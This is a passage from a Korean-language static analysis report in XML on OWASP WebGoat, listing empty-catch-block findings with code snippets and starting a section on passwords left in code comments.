<Value>최소한 예외 사항이 발생했다는 사실을 기록하여 나중에 다시 검토할 때 예외 사항으로 인한 프로그램 동작을 이해할 수 있도록 해야 합니다. 더 좋은 방법은 현재 작업을 취소하는 것입니다. 호출자가 예외 사항을 올바로 처리할 수 없고 예외 사항이 발생한다는 것을 선언하기 어렵거나 불가능한 상황으로 인해 예외 사항이 무시되는 경우, RuntimeException 또는 Error 발생을 고려해 보십시오. 둘 다 검사하지 않는 예외 사항입니다. JDK 1.4부터 RuntimeException에는 다른 예외 사항을 쉽게 래핑할 수 있는 생성자가 있습니다. 

예제 2: Example 1의 코드는 다음과 같이 다시 작성할 수 있습니다.


try {
  doExchange();
}
catch (RareException e) {
  throw new RuntimeException("This can never happen", e);
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. 경우에 따라 무시할 수 있는 드문 유형의 예외 사항이 있습니다. 예를 들면, Thread.sleep()은 InterruptedException을 발생시키고 대부분의 경우 프로그램은 중간에 깨어났는지 여부에 관계없이 동일하게 동작합니다.


  try {
    Thread.sleep(1000);
  }
  catch (InterruptedException e){
    // The thread has been woken up prematurely, but its
    // behavior should be the same either way.
  }
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>32</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="2141A101049B136B169FBAE5AA39E899" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>WeakSessionID.java의 makeLogin() 메서드는 228 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WeakSessionID.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WeakSessionID.java</FilePath>
<LineStart>228</LineStart>
<Snippet>	    username = s.getParser().getStringParameter(USERNAME);
	}
	catch (ParameterNotFoundException pnfe)
	{}
	try</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E9EDBF5BF129C81B7AA27CFB179E8452" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>LessonAdapter.java의 createContent() 메서드는 101 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonAdapter.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/LessonAdapter.java</FilePath>
<LineStart>101</LineStart>
<Snippet>		ec.addElement(pre);
	    }
	    catch (Exception e)
	    {}
	}</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="640709F962A3A6CD1A058C9D600CDD2E" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>SoapRequest.java의 viewWsdl() 메서드는 265 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SoapRequest.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SoapRequest.java</FilePath>
<LineStart>265</LineStart>
<Snippet>	    s.setMessage("Sorry, that answer is invalid. Try again.");
	}
	catch (ParameterNotFoundException pnfe)
	{
	    //DEVNOTE: Eat the exception.</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A809D26405DEE479D931C435A4085878" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>SoapRequest.java의 getResults() 메서드는 431 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SoapRequest.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SoapRequest.java</FilePath>
<LineStart>431</LineStart>
<Snippet>	    {}
	}
	catch (Exception e)
	{}
	return null;</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="CE3973E00A468461684FF1C9C2CCA68C" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>WebSession.java의 update() 메서드는 1027 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>1027</LineStart>
<Snippet>			}
		}
		catch ( Exception e )
		{
		}</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="AA019D41BE25BB0FB11784798C66A90A" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>WsSqlInjection.java의 getCreditCard() 메서드는 273 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WsSqlInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WsSqlInjection.java</FilePath>
<LineStart>273</LineStart>
<Snippet>		return users;
	    }
	    catch (SQLException sqle)
	    {}
	}</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6C4C0C66EADEFA0731473F0CF1E32939" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>LessonTracker.java의 load() 메서드는 262 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonTracker.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/LessonTracker.java</FilePath>
<LineStart>262</LineStart>
<Snippet>		in.close();
	    }
	    catch (Exception e)
	    {}
	}</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="328F190A82702DD0E1B4E91A79F1DF54" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>WSDLScanning.java의 getResults() 메서드는 293 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>293</LineStart>
<Snippet>	    {}
	}
	catch (Exception e)
	{}
	return null;</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C9AC077BDAC3DDDE44672BEDB913CFE3" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>DeleteProfile.java의 updateLessonStatus() 메서드는 176 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DeleteProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/DeleteProfile.java</FilePath>
<LineStart>176</LineStart>
<Snippet>	    }
	}
	catch (ParameterNotFoundException e)
	{}
    }</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6F4483CBB6230FE84094B9B09F39FA67" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>DefaultLessonAction.java의 getIntSessionAttribute() 메서드는 145 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>145</LineStart>
<Snippet>				value = Integer.parseInt(ss);
			}
			catch (NumberFormatException nfe)
			{
			}</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B71E82E29B56F477512F8944B396EB5F" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>LessonTracker.java의 store() 메서드는 403 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonTracker.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/LessonTracker.java</FilePath>
<LineStart>403</LineStart>
<Snippet>		out.close();
	    }
	    catch (Exception e)
	    {}
	}</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="EE9AD154EBC79058311074958E95862E" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ViewProfile.java의 updateLessonStatus() 메서드는 105 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>105</LineStart>
<Snippet>	    }
	}
	catch (ParameterNotFoundException e)
	{}
    }</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="77A35530E212C467C6AFFCA03523D510" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ViewProfile.java의 updateLessonStatus() 메서드는 268 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>268</LineStart>
<Snippet>	    }
	}
	catch (ParameterNotFoundException pnfe)
	{}
    }</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="AB0DC4163B2F4540E8B43D74D6C24B93" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Course.java의 loadLessons() 메서드는 377 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Course.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Course.java</FilePath>
<LineStart>377</LineStart>
<Snippet>    				}
    			}
    			catch (Exception e)
    			{
    				//System.out.println("Warning: " + e.getMessage());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="001E51EC122D0082A9228729D14D43D4" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>UserTracker.java의 getAllUsers() 메서드는 133 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UserTracker.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/UserTracker.java</FilePath>
<LineStart>133</LineStart>
<Snippet>		usersDB.close();
	    }
	    catch (Exception e)
	    {}
	    return allUsers;</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2141A101049B136B169FBAE5AA39E89A" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>WeakSessionID.java의 makeLogin() 메서드는 234 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WeakSessionID.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WeakSessionID.java</FilePath>
<LineStart>234</LineStart>
<Snippet>	    password = s.getParser().getStringParameter(PASSWORD);
	}
	catch (ParameterNotFoundException pnfe)
	{}
</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6C4C0C66EADEFA0731473F0CF1E32938" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>LessonTracker.java의 load() 메서드는 247 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonTracker.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/LessonTracker.java</FilePath>
<LineStart>247</LineStart>
<Snippet>	    }
	}
	catch (FileNotFoundException e)
	{
	    // Normal if the lesson has not been accessed yet.</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="833627E5F9F60C5DC0B7D2E90ADDCAF3" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>FindProfile.java의 foundEmployee() 메서드는 235 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FindProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/FindProfile.java</FilePath>
<LineStart>235</LineStart>
<Snippet>	    found = true;
	}
	catch (ParameterNotFoundException e)
	{}
</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6006134830EAB488FFAED5E6E2F8B1C0" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Login.java의 updateLessonStatus() 메서드는 297 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>297</LineStart>
<Snippet>	    }
	}
	catch (ParameterNotFoundException pnfe)
	{}
    }</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D63662D7BCDCF79874FA9554A6E747F2" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>UserTracker.java의 deleteUser() 메서드는 161 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UserTracker.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/UserTracker.java</FilePath>
<LineStart>161</LineStart>
<Snippet>
	    }
	    catch (Exception e)
	    {}
	}</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="328F190A82702DD0E1B4E91A79F1DF53" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>WSDLScanning.java의 getResults() 메서드는 290 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>290</LineStart>
<Snippet>		}
	    }
	    catch (SQLException sqle)
	    {}
	}</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8034B6BF9C0A3C96E3F529EF7DB07E46" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>LessonAdapter.java의 getInstructions() 메서드는 307 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonAdapter.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/LessonAdapter.java</FilePath>
<LineStart>307</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{}
</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="723A2344C7367746C432EC1E0051D9CC" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>SoapRequest.java의 determineType() 메서드는 322 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SoapRequest.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SoapRequest.java</FilePath>
<LineStart>322</LineStart>
<Snippet>	    }
	}
	catch (ParameterNotFoundException pnfe)
	{
	    //DEVNOTE: Eat the exception.</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="3DD48437A3EC81F297685B39FCBACC59" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>WsSqlInjection.java의 getResults() 메서드는 243 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WsSqlInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WsSqlInjection.java</FilePath>
<LineStart>243</LineStart>
<Snippet>		return results;
	    }
	    catch (SQLException sqle)
	    {}
	}</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A809D26405DEE479D931C435A4085877" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>SoapRequest.java의 getResults() 메서드는 428 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SoapRequest.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SoapRequest.java</FilePath>
<LineStart>428</LineStart>
<Snippet>		}
	    }
	    catch (SQLException sqle)
	    {}
	}</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="77A35530E212C467C6AFFCA03523D50F" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ViewProfile.java의 updateLessonStatus() 메서드는 253 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>253</LineStart>
<Snippet>				    userId, employeeId);
			}
			catch (UnauthorizedException e)
			{}
			if (targetEmployee != null</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D448A9A6989D3E0D1501589E69E90601" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>WSDLScanning.java의 createContent() 메서드는 232 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>232</LineStart>
<Snippet>	    ec.addElement(new P().addElement(t));
	}
	catch (Exception e)
	{
</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="994C4D480E556B07D0349CCB06C5BA1E" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>DefaultLessonAction.java의 isAuthenticated() 메서드는 236 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>236</LineStart>
<Snippet>			authenticated = getBooleanSessionAttribute(s, getLessonName() + ".isAuthenticated");
		}
		catch (ParameterNotFoundException e)
		{	
		}</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="34AAE0A9345FDF3E38CBA13A61FEF92A" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>WsSqlInjection.java의 getResults() 메서드는 246 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WsSqlInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WsSqlInjection.java</FilePath>
<LineStart>246</LineStart>
<Snippet>	    {}
	}
	catch (Exception e)
	{}
	return null;</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B32CF1212F9C99301C355F37AB3AD6A3" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>DefaultLessonAction.java의 getIntRequestAttribute() 메서드는 178 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>178</LineStart>
<Snippet>				value = Integer.parseInt(ss);
			}
			catch (NumberFormatException nfe)
			{
			}</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4FB1967F287C3B421FCDE7B59977AFCA" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ReportCardScreen.java의 createContent() 메서드는 87 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ReportCardScreen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/admin/ReportCardScreen.java</FilePath>
<LineStart>87</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{}
</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="DACF6CF1217EA9A21A29F4A91928BFF3" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>FindProfile.java의 foundEmployee() 메서드는 118 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FindProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/FindProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>	    found = true;
	}
	catch (ParameterNotFoundException e)
	{}
</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="29">
                        <groupTitle>Password Management: Password in Comment</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>암호를 하드코드하는 것은 좋은 방법이 아닙니다. 주석 안에 자세한 암호 정보를 저장하는 것은 암호를 하드코드하는 것과 마찬가지입니다. 모든 프로젝트 개발자에게 암호가 표시될 뿐 아니라 문제 해결을 극히 어렵게 만듭니다. 코드가 운영 단계에 들어간 후에는 암호가 외부로 유출되어 소프트웨어 패치 없이는 암호를 보호하거나 변경할 수 없습니다. 암호로 보호되는 계정이 침해되면 시스템 소유자는 보안과 가용성 중 한 가지를 선택해야 합니다.


예제: 다음 주석은 데이터베이스에 연결하기 위한 기본 암호를 지정합니다.


...
&lt;config&gt;
  &lt;!-- Default username/password is scott/tiger --&gt;
  &lt;username&gt;&lt;/username&gt;
  &lt;password&gt;&lt;/password&gt;
&lt;/config&gt;
...


이 코드는 성공적으로 실행되지만 코드에 액세스할 수 있는 사용자는 암호에도 액세스할 수 있습니다. 직원이 이 정보에 대한 접근 권한을 갖게 되면 이를 사용하여 시스템에 침입할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
